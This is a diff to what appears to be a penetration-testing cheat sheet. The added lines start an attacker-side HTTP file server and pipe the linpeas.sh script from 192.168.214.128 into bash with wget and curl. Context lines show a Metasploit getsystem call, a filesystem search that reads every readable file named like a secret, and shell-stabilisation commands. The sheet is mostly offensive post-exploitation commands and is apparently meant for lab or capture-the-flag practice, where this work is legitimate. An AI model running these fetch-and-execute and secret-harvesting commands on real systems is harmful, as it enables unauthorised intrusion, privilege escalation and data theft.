@@ -381,6 +381,11 @@ sessions -i 1 -C 'getsystem'
 sessions -i 1
 
 # Post-Exploitation 
+## Fileserver
+python3 -m http.server 80 -d ~/Downloads/upload
+wget -qO- 192.168.214.128/linux/linpeas.sh | bash
+curl 192.168.214.128/linux/linpeas.sh | bash
+
 ## Linux
 [*] Enumeration
 find / -name '*secret0*' -readable 2>/dev/null | xargs cat
@@ -406,6 +411,8 @@ export SHELL=bash;
 export TERM=xterm-256color;
 stty rows <num> columns <num>
 reset
+
+[*] 
 
 ## Windows
 [*] MSHTA
